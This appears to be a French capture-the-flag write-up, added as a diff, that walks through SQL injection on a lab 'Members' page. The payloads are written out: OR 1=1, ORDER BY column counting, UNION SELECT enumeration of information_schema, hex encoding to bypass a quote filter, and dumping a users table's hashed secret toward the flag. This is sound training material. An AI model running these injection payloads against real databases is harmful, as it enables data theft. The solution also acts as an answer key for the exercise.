@@ -1,0 +1,43 @@
+Page Members
+--> Essai d'envoi d'un username : erreur SQL
+
+--> essai d'envoi d'une commande avec guillemets --> erreur, protege
+--> Commande [1 OR 1=1]
+--> 1=1 condition toujours vraie donc renvoie tout
+
+--> Ensuite, identifier le nombre de colonnes de la table, avec ORDER BY
+--> 1 ORDER BY 1 ok
+--> 1 ORDER BY 2 ok
+--> 1 ORDER BY 3 ko
+
+--> 2 colonnes
+
+--> Ensuite, 1 UNION SELECT 1, 2 --
+--> Permet de voir quelle colonne correspond a quel chiffre
+
+
+--> Ensuite : 1 UNION SELECT user(), database() -- 
+--> On utilise des fonctions de mariadb
+--> Donne le nom de la db : Member_Sql_Injection
+
+On cherche maintenant le nom des tables qu'elle contient
+
+1 UNION SELECT table_name, 2 FROM information_schema.tables 
+    WHERE table_schema = database() --
+--> On voit une colonne users
+
+--> Nous devons esquiver la portection anti-guillemets.
+--> Nous allons donc convertir "users" en hex pour bypass
+--> "users" donne 0x7573657273
+--> Commande : 1 UNION SELECT column_name, 2 FROM information_schema.columns 
+    WHERE table_name = 0x7573657273 --
+--> Renvoie plein de colonnes, dont commentaires et countersign
+
+--> On explore ces deux colonnes interessantes avec :
+1 UNION SELECT Commentaire, countersign FROM users --
+
+Donne : 5ff9d0165b4f92b14994e5c685cdce28
+puis FortyTwo
+puis fortytwo
+puis conversion sh256
+puis flag !
